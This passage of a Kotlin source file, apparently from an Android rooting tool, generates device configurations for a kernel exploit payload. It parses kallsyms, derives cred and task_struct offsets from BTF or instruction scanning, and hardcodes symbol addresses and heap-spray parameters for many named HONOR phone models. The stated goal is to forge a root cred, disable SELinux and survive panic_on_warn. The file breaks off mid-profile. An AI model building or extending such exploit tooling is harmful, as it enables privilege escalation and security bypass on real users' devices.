package com.extractkit.app

import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/** kallsyms 文本解析：`kallsyms_dump.py` 输出或 System.map 都能吃。 */
object Kallsyms {

    fun parse(text: String): Map<String, Long> {
        val out = HashMap<String, Long>()
        for (raw in text.lineSequence()) {
            val line = raw.trim()
            if (line.isEmpty() || line.startsWith("#")) continue
            val parts = line.split(Regex("\\s+"))
            if (parts.size < 2) continue
            // 内核地址形如 ffffffc0803afc58，16 位十六进制会溢出 Long，
            // 必须先按 ULong 解析再转回（toLongOrNull 会直接返回 null）
            val addr = parts[0].toULongOrNull(16)?.toLong() ?: continue
            val name = if (parts.size >= 3 && parts[1].length == 1) parts[2] else parts[1]
            out.putIfAbsent(name, addr)
        }
        return out
    }
}

/** 从 BTF 取出来的结构体布局。 */
data class Offsets(
    val itimerSize: Int,
    val itimerNode: Int,
    val itimerHead: Int,
    val itimerElist: Int,
    val itimerFiring: Int,
    val itimerHandling: Int,
    val taskCred: Int,
    val taskComm: Int,
    val credSize: Int,
    val credUid: Int,
    val credSecurity: Int,
    val credUser: Int,
    val credUserNs: Int,
    val credUcounts: Int,
    val credGroups: Int,
) {
    fun pretty(): String = buildString {
        appendLine("k_itimer      size=${hex(itimerSize)}  node=${hex(itimerNode)}  head=${hex(itimerHead)}")
        appendLine("k_itimer      elist=${hex(itimerElist)} firing=${hex(itimerFiring)} handling=${hex(itimerHandling)}")
        appendLine("task_struct   cred=${hex(taskCred)}  comm=${hex(taskComm)}")
        appendLine("cred          size=${hex(credSize)} uid=${hex(credUid)}")
        appendLine("cred          security=${hex(credSecurity)} user=${hex(credUser)}")
        appendLine("cred          user_ns=${hex(credUserNs)} ucounts=${hex(credUcounts)} groups=${hex(credGroups)}")
    }

    private fun hex(v: Int) = "0x" + Integer.toHexString(v)
}

object ConfigGen {

    /** 需要从 kallsyms 里拿到的符号。 */
    val REQUIRED_SYMBOLS = listOf(
        "do_timer_create",
        "selinux_state",
        "panic_on_warn",
        "root_user",
        "init_user_ns",
        "init_ucounts",
        "init_groups",
    )

    /**
     * 真正决定「能不能拼出一份能跑的 cfg」的符号。
     *
     * `panic_on_warn` 是**条件必需**：payload 只在运行时读到
     * `/proc/sys/kernel/panic_on_warn != 0` 时才会去抹它（那种内核上不自尽是会被
     * panic 打断的）。绝大多数 Android 内核是 0，所以缺它照样能跑；缺的时候 cfg 里写
     * 0 当「未知」，payload 端见到 0 会：sysctl==0 直接跳过，sysctl!=0 直接
     * CHAIN_STOP:panic_on_warn_set（明确拒绝，不赌内核崩）。
     */
    val CORE_SYMBOLS = REQUIRED_SYMBOLS - "panic_on_warn"

    /**
     * 拼 fake cred 必须的 4 个锚点（内核静态地址，第三方二进制里也是直接内嵌这四个）。
     * 它们与内核 text 无关：只要这 4 个在，就能把 cred 的 user/user_ns/ucounts/groups
     * 指到内核自带的 init_* 结构上，不需要 do_timer_create / selinux_state。
     */
    /**
     * 拼 fake cred 真正绕不开的锚点。
     *
     * `init_ucounts` 不在里面：它是 5.14 才引入的字段，5.10 的 `struct cred` 里
     * 根本没有 `ucounts`（5.10 的 `credUcounts` 就是 `credGroups` 同一个值），
     * 硬写进去等于把所有者的 `group_info` 覆盖成内核指针，必崩。payload 侧见到
     * `INIT_UCOUNTS_STATIC == 0` 会跳过这一项。
     */
    val ANCHOR_SYMBOLS = listOf("root_user", "init_user_ns", "init_groups")

    /** 只有设备上能测出来的部分（tracepoint id 与三处 call site）。 */
    data class Measured(
        val evCacheAlloc: Int = 269,
        val evCacheFree: Int = 272,
        val evPageFree: Int = 273,
        val evPageAlloc: Int = 275,
        val evPcpuDrain: Int = 277,
        val timerSiteOffset: Int = 0x94,
        val credSiteLow21: Int = 0x38458,
        val credReq: Int = 0xB8,
        val credAlloc: Int = 0xC0,
        val taskAllocLow21: Int = 0x1CB240,
        val taskAllocBytes: Int = 0x12C0,
        val objectsPerSlab: Int = 31,
        val paddingSlabs: Int = 150,
        val ntimers: Int = 4096,
        val victimIdx: Int = 2048,
        val lockers: Int = 3,
        val vmaCount: Long = 50000,
        val selinuxBlobOff: Int = 0x8,
        val selinuxSidKernel: Int = 1,
    )

    fun offsetsFromBtf(btf: Btf): Offsets {
        fun need(struct: String, member: String): Int =
            btf.memberOffset(struct, member)
                ?: throw IllegalStateException("BTF 里 $struct.$member 找不到")
        return Offsets(
            itimerSize = btf.sizeOf("k_itimer") ?: throw IllegalStateException("BTF 里没有 k_itimer"),
            itimerNode = need("k_itimer", "node"),
            itimerHead = need("k_itimer", "head"),
            itimerElist = need("k_itimer", "elist"),
            itimerFiring = need("k_itimer", "firing"),
            itimerHandling = need("k_itimer", "handling"),
            taskCred = need("task_struct", "cred"),
            taskComm = need("task_struct", "comm"),
            credSize = btf.sizeOf("cred") ?: throw IllegalStateException("BTF 里没有 cred"),
            credUid = need("cred", "uid"),
            credSecurity = need("cred", "security"),
            credUser = need("cred", "user"),
            credUserNs = need("cred", "user_ns"),
            credUcounts = need("cred", "ucounts"),
            credGroups = need("cred", "group_info"),
        )
    }

    /**
     * 没有 BTF 的镜像（典型是 5.10 那一代）用指令挖偏移。
     *
     * BTF 只是「结构布局的说明书」，而内核里三处 `kmem_cache_create` 调用都把
     * `sizeof(struct ...)` 当成参数传进去，`exit_creds()` 又会把 `tsk->cred`
     * 清成 NULL —— 这四处都是定长编码，读得出来：
     *
     *  - `init_posix_timers`  → `kmem_cache_create("posix_timers", sizeof(struct k_itimer), …)`
     *  - `fork_init`          → `kmem_cache_create_usercopy("task_struct", sizeof(struct task_struct), …)`
     *  - `cred_init`          → `kmem_cache_create("cred_jar", sizeof(struct cred), …)`
     *  - `exit_creds`         → `tsk->cred = NULL`（`STR XZR, [X0, #imm]`）
     *
     * cred 内部的字段位置由 `sizeof(struct cred)` 反推（各代都成立）：
     * `group_info` 在末尾 `rcu_head` 之前（size−0x18），往前依次
     * user_ns / user / security，KMI≥5.14 还要多一个 ucounts。
     */
    fun offsetsFromCode(image: ByteArray, syms: Map<String, Long>, base: Long): Offsets? {
        fun fileOff(name: String): Int? {
            val a = syms[name] ?: return null
            val off = a - base
            return if (off in 0 until image.size - 256) off.toInt() else null
        }

        fun word(p: Int): Long {
            if (p < 0 || p + 4 > image.size) return 0
            return ((image[p].toLong() and 0xFF) or
                ((image[p + 1].toLong() and 0xFF) shl 8) or
                ((image[p + 2].toLong() and 0xFF) shl 16) or
                ((image[p + 3].toLong() and 0xFF) shl 24))
        }

        /**
         * 在函数体里找「MOVZ W1/W2,#imm 紧跟着 BL」——`kmem_cache_create(name, size, align, flags, ctor)`
         * 的第 2 个参数就是 sizeof，编译器通常落在 w1（少数版本用 w2）。
         * 只扫 0x600 字节，找不到就放弃（不会瞎猜）。
         */
        fun sizeArg(fn: String, lo: Int, hi: Int): Int? {
            val start = fileOff(fn) ?: return null
            var lastW1 = -1
            var lastW2 = -1
            var p = start
            val end = minOf(start + 0x600, image.size - 4)
            while (p < end) {
                val w = word(p)
                val top = w and 0xFF800000L
                val rd = (w and 0x1FL).toInt()
                if ((top == 0x52800000L || top == 0xD2800000L) && (rd == 1 || rd == 2)) {
                    val imm = (w ushr 5) and 0xFFFF
                    val hw = ((w ushr 21) and 0x3L).toInt()
                    val v = (imm shl (16 * hw)).toInt()
                    if (rd == 1) lastW1 = v else lastW2 = v
                } else if ((w and 0xFC000000L) == 0x94000000L) {   // BL
                    val cand = if (lastW1 >= 0) lastW1 else lastW2
                    if (cand in lo..hi && cand % 8 == 0) return cand
                    lastW1 = -1
                    lastW2 = -1
                }
                p += 4
            }
            return null
        }

        /**
         * `STR XZR, [Xn, #imm]`：exit_creds 先清 `real_cred`、再清 `cred`。
         * 结构体里 `cred` 紧跟 `real_cred`，所以取**第二个** store；只找到一个时 +8。
         */
        fun taskCredOff(): Int? {
            val start = fileOff("exit_creds") ?: return null
            var p = start
            val end = minOf(start + 0x200, image.size - 4)
            val hits = ArrayList<Int>(4)
            while (p < end) {
                val w = word(p)
                if ((w and 0xFFC00000L) == 0xF9000000L && (w and 0x1FL) == 31L) {
                    val off = (((w ushr 10) and 0xFFFL).toInt() * 8)
                    if (off in 0x400..0x1600 && !hits.contains(off)) hits.add(off)
                    if (hits.size >= 2) break
                }
                p += 4
            }
            return when {
                hits.size >= 2 -> maxOf(hits[0], hits[1])
                hits.size == 1 -> hits[0] + 8
                else -> null
            }
        }

        // `init_posix_timers` 在部分 5.10 内核里连符号都没有（140,445 个符号里就缺它），
        // 这时把尺寸留 0：payload 见到 0 就只按 call site 认对象，不按尺寸过滤。
        val itimerSize = sizeArg("init_posix_timers", 0x80, 0x400) ?: 0
        val credSize = sizeArg("cred_init", 0x80, 0x200) ?: return null
        val taskSize = sizeArg("fork_init", 0x600, 0x3000) ?: return null
        val taskCred = taskCredOff() ?: return null

        val big = credSize >= 0xB0
        val security = credSize - if (big) 0x38 else 0x30
        val user = security + 8
        val userNs = user + 8
        val groups = credSize - 0x18
        // KMI < 5.14 没有 ucounts：与 groups 同值 → payload 会自动跳过写入
        val ucounts = if (big) userNs + 8 else groups

        return Offsets(
            itimerSize = itimerSize,
            itimerNode = 0x78,
            itimerHead = 0,
            itimerElist = 0,
            itimerFiring = 0,
            itimerHandling = 0,
            taskCred = taskCred,
            taskComm = taskCred + 0x10,
            credSize = credSize,
            credUid = if (big) 8 else 4,
            credSecurity = security,
            credUser = user,
            credUserNs = userNs,
            credUcounts = ucounts,
            credGroups = groups,
        )
    }

    /**
     * 生成 payload 运行时读的 device.cfg（336 字节）。
     * 字段顺序必须和 payload/src/runtime_cfg.h 的 load_device_cfg() 一一对应，
     * 否则 payload 会静默回落到编译期默认值。
     */
    fun emitCfgBlob(syms: Map<String, Long>, off: Offsets, m: Measured): ByteArray {
        // 双模：锚点是硬需求（拼 fake cred 要用），内核 text 符号是可选需求。
        // 缺 do_timer_create / selinux_state 时 cfg 里这两项写 0，payload 会自动
        // 切到 offsets-only（只靠结构偏移 + 尺寸类 + 堆喷），不再需要 KASLR slide。
        require(ConfigGen.ANCHOR_SYMBOLS.all { (syms[it] ?: 0L) != 0L }) { "kallsyms 缺 cred 锚点符号" }
        val timerSym = syms["do_timer_create"] ?: 0L
        val staticTimer = if (timerSym != 0L) timerSym + m.timerSiteOffset.toLong() else 0L
        val u64 = listOf(
            staticTimer,
            staticTimer and 0x1FFFFF,
            syms["selinux_state"] ?: 0L,
            syms["panic_on_warn"] ?: 0L,
            syms["root_user"] ?: 0L,
            syms["init_user_ns"] ?: 0L,
            // 5.10 没有 ucounts（5.14 才引入）→ 写 0，payload 会跳过这一项
            syms["init_ucounts"] ?: 0L,
            syms["init_groups"] ?: 0L,
            off.taskCred.toLong(),
            off.taskComm.toLong(),
            m.taskAllocLow21.toLong(),
            m.taskAllocBytes.toLong(),
            m.taskAllocBytes.toLong(),
            m.credReq.toLong(),
            m.credAlloc.toLong(),
            m.credSiteLow21.toLong(),
            off.itimerSize.toLong(),
            off.itimerNode.toLong(),
            off.itimerHead.toLong(),
            off.itimerElist.toLong(),
            off.itimerFiring.toLong(),
            off.itimerHandling.toLong(),
            off.itimerSize.toLong(),
            off.credUid.toLong(),
            off.credSecurity.toLong(),
            off.credUser.toLong(),
            off.credUserNs.toLong(),
            off.credUcounts.toLong(),
            off.credGroups.toLong(),
            0x1f00L,
            m.selinuxBlobOff.toLong(),
            m.selinuxSidKernel.toLong(),
            0x1ffffffffffL,
            m.ntimers.toLong(),
            m.victimIdx.toLong(),
            (m.paddingSlabs * m.objectsPerSlab).toLong(),
            m.lockers.toLong(),
            m.vmaCount,
        )
        require(u64.size == 38) { "字段数应为 38，实际 ${u64.size}" }
        val ev = intArrayOf(
            m.evCacheAlloc, m.evCacheFree, m.evPageFree, m.evPageAlloc, m.evPcpuDrain,
        )
        val out = java.io.ByteArrayOutputStream()
        out.write("EXKCFG01".toByteArray(Charsets.US_ASCII))
        out.write(byteArrayOf(38, 0, 0, 0))                     // 小端 u32：38 字段
        val buf = java.nio.ByteBuffer.allocate(8).order(java.nio.ByteOrder.LITTLE_ENDIAN)
        u64.forEach { v ->
            buf.clear(); buf.putLong(v); out.write(buf.array())
        }
        ev.forEach { v ->
            buf.clear(); buf.putInt(v); out.write(buf.array(), 0, 4)
        }
        return out.toByteArray()
    }

    /**
     * 内置 profile：把这台机器（PPG-AN00 / 6.6.118-android15-8-g554929766a0d）
     * 标定出来的全套常量编译进 App。同内核设备开箱即用，不用再选 boot.img。
     */
    data class Profile(
        val name: String,
        val prefix: String,
        val release: String,
        val symbols: Map<String, Long>,
        val offsets: Offsets,
        val measured: Measured,
        /** 98937 内核表要用的绝对地址；0 表示该 profile 没记（旧文件） */
        val timerLink: Long = 0,
        val credLink: Long = 0,
        /**
         * 同一份内核 release 可能在多个机型上共用（例如 MTN-AN00 / MTN-AN80 同为
         * 6.1.157-android14-11-g19a495a97bff，boot.img 与内核逐字节相同，call site 也一样）。
         * 但 release 相同也可能真的不是同一份内核（AMG-AN00 / AMP-AN10 就不同），
         * 所以按 Build.MODEL 精确匹配；空 = 不限机型。
         */
        val models: List<String> = emptyList(),
    )

    private val BUILTIN_PROFILES: List<Profile> = listOf(
        // 用户提供的 boot.img（5.10.66-android12-9-gc55fd18209d0）：无 .BTF，
        // 偏移来自 offsetsFromCode，call site 由反汇编 bl 自动算出。
        Profile(
            name = "5.10.66-android12-9 / BTF-less",
            prefix = "5.10.66-android12-9-gc55fd18209d0",
            release = "5.10.66-android12-9-gc55fd18209d0",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC010458D5CuL.toLong(),
                "selinux_state" to 0xFFFFFFC0136DA5A0uL.toLong(),
                "panic_on_warn" to 0xFFFFFFC012C09DD8uL.toLong(),
                "root_user" to 0xFFFFFFC012C2BF68uL.toLong(),
                "init_user_ns" to 0xFFFFFFC012C2BD38uL.toLong(),
                "init_ucounts" to 0x0uL.toLong(),
                "init_groups" to 0xFFFFFFC012C2D1E0uL.toLong(),
            ),
            offsets = Offsets(
                // 5.10.66 的 init_posix_timers 也不在 kallsyms 里 → 尺寸算不出，先留 0：
                // payload 见 itimerSize=0 时只按 call site 认对象（与 ALT-AN00 首版一致）。
                itimerSize = 0, itimerNode = 0x78, itimerHead = 0, itimerElist = 0, itimerFiring = 0, itimerHandling = 0,
                taskCred = 0x7B8,
                taskComm = 0x7C8,
                credSize = 0xA8,
                credUid = 0x4,
                credSecurity = 0x78,
                credUser = 0x80,
                credUserNs = 0x88,
                credUcounts = 0x90,
                credGroups = 0x90,
            ),
            measured = Measured(
                timerSiteOffset = 0x98,
                credSiteLow21 = 0x25B08,
                taskAllocLow21 = 0x1449C4,
                taskAllocBytes = 0x1340,
                credReq = 0xA8,
                credAlloc = 0xC0,
            ),
        ),
        // 5.10.252：没有 .BTF，偏移全部由 tools 的 offsetsFromCode 从指令里挖出来
        // （`kmem_cache_create` 的 size 在 w1、`exit_creds` 的第二个 STR XZR 才是 cred）。
        Profile(
            name = "ALT-AN00 / 5.10.252-android12-9",
            prefix = "5.10.252-android12-9-g839eb53a56c3",
            models = listOf("ALT-AN00"),
            release = "5.10.252-android12-9-g839eb53a56c3",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC00840AF68uL.toLong(),
                "selinux_state" to 0xFFFFFFC00AE84B40uL.toLong(),
                "panic_on_warn" to 0xFFFFFFC00A809C00uL.toLong(),
                "root_user" to 0xFFFFFFC00A82F598uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A82F630uL.toLong(),
                // 5.10 没有 ucounts（5.14 才引入）→ 0，payload 会跳过这一项
                "init_ucounts" to 0x0uL.toLong(),
                "init_groups" to 0xFFFFFFC00A830AC0uL.toLong(),
            ),
            offsets = Offsets(
                // init_posix_timers 在这颗内核的 kallsyms 里没有 → 静态算不出尺寸；
                // 真值取自两处硬证据：设备日志 `[base] cache sizes: 0x118 x512`（k_itimer 分配），
                // 以及同分支 BRP-TN00（5.10.252-gc44b5448b117）档案 itimerSize=0x118。
                itimerSize = 0x118, itimerNode = 0x78, itimerHead = 0, itimerElist = 0, itimerFiring = 0, itimerHandling = 0,
                taskCred = 0x7b8, taskComm = 0x7c8,
                credSize = 0xa8, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x90,
            ),
            measured = Measured(
                timerSiteOffset = 0x9c,
                credSiteLow21 = 0x29a70,
                taskAllocLow21 = 0xe9474,
                taskAllocBytes = 0x1340,
                credReq = 0xa8,
                credAlloc = 0xc0,
            ),
        ),
        Profile(
            name = "HONOR PPG-AN00 / 6.6.118-android15-8",
            prefix = "6.6.118-android15-8-g554929766a0d",
            models = listOf("PPG-AN00"),
            release = "6.6.118-android15-8-g554929766a0d-abogki544555896-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0803AFC58uL.toLong(),
                "selinux_state" to 0xFFFFFFC0823BA418uL.toLong(),
                "panic_on_warn" to 0xFFFFFFC08216AE0CuL.toLong(),
                "root_user" to 0xFFFFFFC08218F228uL.toLong(),
                "init_user_ns" to 0xFFFFFFC08218EF98uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082190CF8uL.toLong(),
                "init_groups" to 0xFFFFFFC082190788uL.toLong(),
            ),
            offsets = Baseline.offsets,
            measured = Measured(),
        ),
        // ---- 由工具链从固件 Image 反解生成（tools: ProfileGenTest）----

        Profile(
            name = "PPG-AN00 / 6.6.89-android15-8 (FW135)",
            prefix = "6.6.89-android15-8-g082e5a98dac1",
            release = "6.6.89-android15-8-g082e5a98dac1-abogki463734347-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0803985E4uL.toLong(),
                "selinux_state" to 0xFFFFFFC082396FD8uL.toLong(),
                "panic_on_warn" to 0xFFFFFFC08214AE08uL.toLong(),
                "root_user" to 0xFFFFFFC08216F130uL.toLong(),
                "init_user_ns" to 0xFFFFFFC08216EEA0uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082170C00uL.toLong(),
                "init_groups" to 0xFFFFFFC082170690uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x820, taskComm = 0x830,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            models = listOf("PPG-AN00"),
            measured = Measured(
                timerSiteOffset = 0x94,
                credSiteLow21 = 0x64F08,
                taskAllocLow21 = 0x607FC,
                taskAllocBytes = 0x12C0,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "AMG-AN00 / 6.1.157-android14-11",
            prefix = "6.1.157-android14-11-g2646292297b1",
            models = listOf("AMG-AN00"),
            release = "6.1.157-android14-11-g2646292297b1",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0083BEC84uL.toLong(),
                "selinux_state" to 0xFFFFFFC00A6FCA00uL.toLong(),
                "panic_on_warn" to 0xFFFFFFC00A0AAE08uL.toLong(),
                "root_user" to 0xFFFFFFC00A0D09D8uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A0D0748uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A0D2268uL.toLong(),
                "init_groups" to 0xFFFFFFC00A0D1CF8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x838, taskComm = 0x848,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x94,
                credSiteLow21 = 0xE6C6C,
                taskAllocLow21 = 0x19F600,
                taskAllocBytes = 0x12C0,
                credReq = 0xB0,
                credAlloc = 0xB0,
            ),
        ),
        // MTN-AN00 与 MTN-AN80 用的是同一份 boot.img（sha256 136b7db0…），
        // 内核也逐字节相同（Image d12938d9…，仅切法差 56 字节前缀），
        // 因此 call site 必须一致；外部档案与本地重解都是 0x94 / 0x10B7F8 / 0x19ECC0。

        Profile(
            name = "MTN-AN00/AN80 / 6.1.157-android14-11",
            prefix = "6.1.157-android14-11-g19a495a97bff",
            release = "6.1.157-android14-11-g19a495a97bff",
            models = listOf("MTN-AN00", "MTN-AN80"),
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0083BE82CuL.toLong(),
                "selinux_state" to 0xFFFFFFC00A6FCA40uL.toLong(),
                "panic_on_warn" to 0xFFFFFFC00A0AAE08uL.toLong(),
                "root_user" to 0xFFFFFFC00A0D09D8uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A0D0748uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A0D2268uL.toLong(),
                "init_groups" to 0xFFFFFFC00A0D1CF8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x838, taskComm = 0x848,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x94,
                credSiteLow21 = 0x10B7F8,
                taskAllocLow21 = 0x19ECC0,
                taskAllocBytes = 0x12C0,
                credReq = 0xB0,
                credAlloc = 0xB0,
            ),
        ),

        Profile(
            name = "PPG-AN00 / 6.6.89-android15-8",
            prefix = "6.6.89-android15-8-g660f666ec112",
            models = listOf("PPG-AN00"),
            release = "6.6.89-android15-8-g660f666ec112-abogki430809029-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0803986ACuL.toLong(),
                "selinux_state" to 0xFFFFFFC082396FD8uL.toLong(),
                "panic_on_warn" to 0xFFFFFFC08214AE08uL.toLong(),
                "root_user" to 0xFFFFFFC08216F130uL.toLong(),
                "init_user_ns" to 0xFFFFFFC08216EEA0uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082170C00uL.toLong(),
                "init_groups" to 0xFFFFFFC082170690uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x820, taskComm = 0x830,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0x94,
                credSiteLow21 = 0xA6BA4,
                taskAllocLow21 = 0xA2498,
                taskAllocBytes = 0x12C0,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),

        // ==== 额外内核档案（tools/gen_profiles.py 生成） ====

        Profile(
            name = "SER-AN00 / AAK-AN00 / 6.6.118-android15-8",
            prefix = "6.6.118-android15-8-gf17133276a57-abogki518694926-4k",
            release = "6.6.118-android15-8-gf17133276a57-abogki518694926-4k",
            models = listOf("SER-AN00", "AAK-AN00"),
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0803AEBACuL.toLong(),
                "selinux_state" to 0xFFFFFFC0823BA418uL.toLong(),
                "panic_on_warn" to 0xFFFFFFC08216AE0CuL.toLong(),
                "root_user" to 0xFFFFFFC08218F228uL.toLong(),
                "init_user_ns" to 0xFFFFFFC08218EF98uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082190CF8uL.toLong(),
                "init_groups" to 0xFFFFFFC082190788uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x820, taskComm = 0x830,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0x94,
                credSiteLow21 = 0x536A0,
                taskAllocLow21 = 0x1E0E48,
                taskAllocBytes = 0x12C0,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),


        Profile(
            name = "APH-AN00 / 6.12.58-android16-6",
            prefix = "6.12.58-android16-6-g3a7ac1674240-abogki541502914-4k",
            release = "6.12.58-android16-6-g3a7ac1674240-abogki541502914-4k",
            models = listOf("APH-AN00"),
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC08051A064uL.toLong(),
                "selinux_state" to 0xFFFFFFC0827E7A60uL.toLong(),
                "root_user" to 0xFFFFFFC0825723B0uL.toLong(),
                "init_user_ns" to 0xFFFFFFC082572138uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082573D48uL.toLong(),
                "init_groups" to 0xFFFFFFC082573878uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x100, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x900, taskComm = 0x910,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0xAC,
                credSiteLow21 = 0x19C474,
                taskAllocLow21 = 0x1F0D64,
                taskAllocBytes = 0x1440,
                credReq = 0xB8,
                credAlloc = 0xB8,
            ),
        ),


        Profile(
            name = "BVL-AN00 / 6.1.157-android14-11",
            prefix = "6.1.157-android14-11-g7d3922fade43",
            release = "6.1.157-android14-11-g7d3922fade43",
            models = listOf("BVL-AN00"),
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0084AC368uL.toLong(),
                "selinux_state" to 0xFFFFFFC00A84B038uL.toLong(),
                "root_user" to 0xFFFFFFC00A212C60uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A2129D0uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A2144F0uL.toLong(),
                "init_groups" to 0xFFFFFFC00A213F80uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x118, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x840, taskComm = 0x850,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0xB8,
                credSiteLow21 = 0x3B74C,
                taskAllocLow21 = 0xFF0D0,
                taskAllocBytes = 0x1300,
                credReq = 0xB0,
                credAlloc = 0xB0,
            ),
        ),


        Profile(
            name = "CGL-W60 / 6.1.157-android14-11",
            prefix = "6.1.157-android14-11-gaaa383620ebf",
            release = "6.1.157-android14-11-gaaa383620ebf",
            models = listOf("CGL-W60"),
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0083C096CuL.toLong(),
                "selinux_state" to 0xFFFFFFC00A6FDE40uL.toLong(),
                "root_user" to 0xFFFFFFC00A0D09D8uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A0D0748uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A0D2268uL.toLong(),
                "init_groups" to 0xFFFFFFC00A0D1CF8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x838, taskComm = 0x848,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x94,
                credSiteLow21 = 0x8DE68,
                taskAllocLow21 = 0x196CF0,
                taskAllocBytes = 0x12C0,
                credReq = 0xB0,
                credAlloc = 0xB0,
            ),
        ),


        Profile(
            name = "ELP-AN00 / 6.1.128-android14-11",
            prefix = "6.1.128-android14-11-gec1055c9cbb5",
            release = "6.1.128-android14-11-gec1055c9cbb5",
            models = listOf("ELP-AN00"),
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC008445C00uL.toLong(),
                "selinux_state" to 0xFFFFFFC00A827FA8uL.toLong(),
                "root_user" to 0xFFFFFFC00A1F2C20uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A1F2990uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A1F44B0uL.toLong(),
                "init_groups" to 0xFFFFFFC00A1F3F40uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x118, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x840, taskComm = 0x850,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0xB8,
                credSiteLow21 = 0x3E244,
                taskAllocLow21 = 0xFBB14,
                taskAllocBytes = 0x1300,
                credReq = 0xB0,
                credAlloc = 0xB0,
            ),
        ),


        Profile(
            name = "PTP-AN10 / 6.6.118-android15-8",
            prefix = "6.6.118-android15-8-ga812a1946391-abogki576098434-4k",
            release = "6.6.118-android15-8-ga812a1946391-abogki576098434-4k",
            models = listOf("PTP-AN10"),
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0803B1340uL.toLong(),
